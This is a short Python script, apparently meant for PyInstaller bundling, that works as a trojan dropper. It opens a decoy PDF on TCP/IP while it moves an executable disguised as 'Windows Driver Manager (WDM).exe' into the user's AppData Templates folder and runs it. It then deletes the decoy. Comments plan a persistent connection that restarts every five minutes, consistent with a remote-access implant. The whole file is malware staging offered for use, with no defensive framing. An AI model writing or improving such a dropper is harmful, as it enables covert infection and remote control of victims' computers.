#!/usr/bin/env python

import subprocess, sys, os

file_name = os.path.join(sys._MEIPASS, "tcp_ip_intro.pdf")
process = subprocess.Popen(file_name, shell=True)

file_src = os.path.join(sys._MEIPASS, "Windows Driver Manager (WDM).exe")
folder_dest = os.path.join(os.environ["appdata"], "Microsoft", "Windows", "Templates")
file_dest = folder_dest + "\\Windows Driver Manager (WDM).exe"
subprocess.call(["move", "/Y", file_src, folder_dest], shell=True)
os.startfile(file_dest)

process.wait()
# until to find a solution for being replaced with PreWDM
os.remove(file_name)

# SystemExit do not catch
# Run main connection through second thread
# and check connection by main thread every 5 min,
# if connection is lost - interrupt the second thread and run it again

# where to extract including files, how to add a custom path in pyinstaller